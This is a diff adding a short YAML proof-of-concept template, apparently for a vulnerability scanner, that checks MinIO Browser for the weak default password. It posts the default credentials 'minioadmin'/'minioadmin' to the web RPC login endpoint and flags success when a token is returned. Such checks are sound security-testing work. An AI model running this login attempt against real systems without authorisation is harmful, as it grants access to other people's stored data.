@@ -1,0 +1,21 @@
+id: poc-yaml-minio-browser-weak-pass
+info:
+  name: MinIO Browser 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: MinIO
+  osprey-id: vb_2021_0014
+requests:
+- method: POST
+  path: /minio/webrpc
+  headers:
+    Content-Type: application/json
+  data: '{"id":1, "jsonrpc":"2.0", "method": "Web.Login", "params":{"password": "minioadmin",
+    "username": "minioadmin"}}'
+  expression: 'status_code == 200 && contains(body, "uiVersion") &&  contains(body,
+    "token") && contains(content_type,"json")
+
+    '
+variables: {}
+transport: http
